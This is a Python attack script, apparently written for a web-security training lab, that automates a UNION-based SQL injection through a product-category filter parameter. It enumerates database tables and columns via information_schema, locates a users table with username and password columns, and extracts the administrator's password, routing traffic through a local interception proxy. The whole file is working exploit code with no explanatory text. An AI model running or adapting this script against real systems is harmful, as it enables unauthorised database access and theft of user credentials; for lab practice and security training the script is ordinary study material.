import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_requests(url, payload):
    uri = '/filter?category=Gifts'
    r = requests.get(url + uri + payload, verify= False , proxies=proxy)
    return r.text

def SQLi_users_table(url):
    payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_requests(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    table_name = soup.find(text= re.compile('.*users.*') )
    if table_name is None:
        return False
    else: return table_name

def SQLi_users_columns(url, users_table):
    payload = "' UNION SELECT column_name , NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_requests(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_columns = soup.find(string= re.compile('.*username.*'))
    password_columns = soup.find(text= re.compile('.*password.*'))
    if username_columns and password_columns is None:
        return False
    else:
        return username_columns, password_columns

def SQLi_union(username_columns, password_columns, users_table):
    payload = "' UNION SELECT %s , %s from %s--" %(username_columns, password_columns, users_table)
    res = perform_requests(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text='administrator').parent.findNext('td').contents[0]
    if admin_password is None:
        return False
    else:
        return admin_password

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example : %s www.example.com" % sys.argv[0])

    print('[+] Looking for user table')
    users_table = SQLi_users_table(url)
    if users_table:
        print("[+] Here is the user table: %s" % users_table )
        username_columns, password_columns = SQLi_users_columns(url, users_table)
        if username_columns and password_columns:
            print("[+] The username columns is " + username_columns)
            print("[+] The password columns is " + password_columns)
            admin_password = SQLi_union(username_columns, password_columns, users_table)
            print("[+] Performing Union attack...")
            if admin_password:
                print("[+] The admin_password is %s" % admin_password)
            else:
                print("[-] Couldn't retrieve admin's username and password")
        else:
            print("[-] Couldn't  retrieve username and password")
    else:
        print('[-] User table not found')